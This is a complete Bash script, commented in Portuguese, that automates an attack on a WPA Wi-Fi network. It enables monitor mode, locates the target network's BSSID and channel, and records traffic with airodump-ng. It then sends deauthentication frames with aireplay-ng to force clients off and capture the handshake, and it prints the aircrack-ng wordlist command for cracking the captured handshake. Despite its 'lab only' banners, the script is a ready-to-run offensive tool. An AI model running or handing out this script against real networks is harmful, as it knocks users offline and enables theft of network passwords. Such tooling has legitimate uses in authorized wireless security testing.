#!/bin/bash
# Script para captura rápida de handshake WiFi
# APENAS para uso em ambiente LAB controlado!

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

# Parâmetros padrão
INTERFACE="wlan0"
TARGET_SSID=""
OUTPUT_DIR="captures"
CAPTURE_TIME=60
DEAUTH_COUNT=10

# Parse argumentos
while getopts "i:s:o:t:d:h" opt; do
  case $opt in
    i) INTERFACE="$OPTARG" ;;
    s) TARGET_SSID="$OPTARG" ;;
    o) OUTPUT_DIR="$OPTARG" ;;
    t) CAPTURE_TIME="$OPTARG" ;;
    d) DEAUTH_COUNT="$OPTARG" ;;
    h)
      echo "Uso: $0 -s SSID [-i interface] [-o output_dir] [-t time] [-d deauth_count]"
      echo ""
      echo "  -s SSID          SSID alvo (obrigatório)"
      echo "  -i interface     Interface WiFi (padrão: wlan0)"
      echo "  -o output_dir    Diretório de saída (padrão: captures)"
      echo "  -t time          Tempo de captura em segundos (padrão: 60)"
      echo "  -d deauth_count  Número de pacotes deauth (padrão: 10)"
      exit 0
      ;;
    \?)
      echo "Opção inválida: -$OPTARG" >&2
      exit 1
      ;;
  esac
done

# Verificar SSID
if [ -z "$TARGET_SSID" ]; then
    echo -e "${RED}Erro: SSID é obrigatório (-s)${NC}"
    echo "Use -h para ajuda"
    exit 1
fi

# Verificar root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}Este script deve ser executado como root${NC}"
   exit 1
fi

echo -e "${CYAN}========================================${NC}"
echo -e "${CYAN}Captura de Handshake WiFi${NC}"
echo -e "${CYAN}========================================${NC}"
echo ""
echo "SSID Alvo:    $TARGET_SSID"
echo "Interface:    $INTERFACE"
echo "Tempo:        ${CAPTURE_TIME}s"
echo "Output:       $OUTPUT_DIR"
echo ""
echo -e "${YELLOW}AVISO: Use apenas em redes autorizadas!${NC}"
echo ""

# Criar diretório de output
mkdir -p "$OUTPUT_DIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_FILE="$OUTPUT_DIR/handshake_${TARGET_SSID}_${TIMESTAMP}"

# Cleanup em caso de interrupção
cleanup() {
    echo ""
    echo -e "${YELLOW}Limpando...${NC}"
    
    # Parar processos
    killall airodump-ng 2>/dev/null || true
    killall aireplay-ng 2>/dev/null || true
    
    # Desativar modo monitor
    if [ -n "$MON_INTERFACE" ]; then
        airmon-ng stop "$MON_INTERFACE" &>/dev/null || true
    fi
    
    # Reiniciar NetworkManager
    systemctl start NetworkManager 2>/dev/null || true
    
    echo -e "${GREEN}Cleanup concluído${NC}"
    exit 0
}

trap cleanup INT TERM

echo -e "${YELLOW}[1/5] Parando serviços conflituantes...${NC}"
systemctl stop NetworkManager 2>/dev/null || true
systemctl stop wpa_supplicant 2>/dev/null || true
killall wpa_supplicant 2>/dev/null || true

echo -e "${YELLOW}[2/5] Ativando modo monitor...${NC}"
airmon-ng start "$INTERFACE"
MON_INTERFACE="${INTERFACE}mon"

# Verificar se modo monitor foi ativado
if ! iwconfig 2>/dev/null | grep -q "$MON_INTERFACE"; then
    echo -e "${RED}Erro: Modo monitor não ativado${NC}"
    cleanup
fi

echo -e "${GREEN}✓ Modo monitor ativo: $MON_INTERFACE${NC}"

echo -e "\n${YELLOW}[3/5] Escaneando redes...${NC}"
echo "Procurando SSID: $TARGET_SSID"

# Escanear por 10 segundos para encontrar BSSID e canal
timeout 10 airodump-ng "$MON_INTERFACE" --output-format csv -w "/tmp/scan_$$" &>/dev/null || true

# Extrair BSSID e canal
BSSID=$(grep -a "$TARGET_SSID" "/tmp/scan_$$-01.csv" 2>/dev/null | head -n1 | cut -d',' -f1 | tr -d ' ')
CHANNEL=$(grep -a "$TARGET_SSID" "/tmp/scan_$$-01.csv" 2>/dev/null | head -n1 | cut -d',' -f4 | tr -d ' ')

rm -f /tmp/scan_$$* 2>/dev/null

if [ -z "$BSSID" ]; then
    echo -e "${RED}Erro: SSID '$TARGET_SSID' não encontrado${NC}"
    cleanup
fi

echo -e "${GREEN}✓ Alvo encontrado:${NC}"
echo "  BSSID:  $BSSID"
echo "  Canal:  $CHANNEL"

echo -e "\n${YELLOW}[4/5] Capturando tráfego...${NC}"
echo "Capturando por ${CAPTURE_TIME}s no canal $CHANNEL"

# Iniciar captura
airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$OUTPUT_FILE" "$MON_INTERFACE" &
AIRODUMP_PID=$!

# Aguardar estabilização
sleep 5

echo -e "\n${YELLOW}[5/5] Forçando handshake (deauth)...${NC}"
echo "Enviando $DEAUTH_COUNT pacotes de deauth..."

# Enviar deauth
aireplay-ng --deauth "$DEAUTH_COUNT" -a "$BSSID" "$MON_INTERFACE" &>/dev/null &
AIREPLAY_PID=$!

# Aguardar captura
echo ""
echo -e "${CYAN}Capturando... (${CAPTURE_TIME}s)${NC}"
for ((i=$CAPTURE_TIME; i>0; i--)); do
    echo -ne "\r  Tempo restante: ${i}s   "
    sleep 1
done
echo ""

# Parar captura
kill $AIRODUMP_PID 2>/dev/null || true
kill $AIREPLAY_PID 2>/dev/null || true
sleep 2

# Verificar se handshake foi capturado
CAPTURE_FILE="${OUTPUT_FILE}-01.cap"

if [ -f "$CAPTURE_FILE" ]; then
    echo -e "\n${YELLOW}Verificando handshake capturado...${NC}"
    
    # Usar aircrack para verificar
    if aircrack-ng "$CAPTURE_FILE" 2>&1 | grep -q "1 handshake"; then
        echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║   ✓ Handshake Capturado! ✓            ║${NC}"
        echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
        echo ""
        echo "Ficheiro: $CAPTURE_FILE"
        echo ""
        echo -e "${CYAN}Para crackear:${NC}"
        echo "  aircrack-ng -w wordlist.txt $CAPTURE_FILE"
        echo ""
    else
        echo -e "${YELLOW}⚠ Handshake pode não ter sido capturado${NC}"
        echo "Ficheiro salvo: $CAPTURE_FILE"
        echo "Verifique manualmente com:"
        echo "  aircrack-ng $CAPTURE_FILE"
    fi
else
    echo -e "${RED}✗ Erro: Ficheiro de captura não encontrado${NC}"
fi

# Cleanup
cleanup
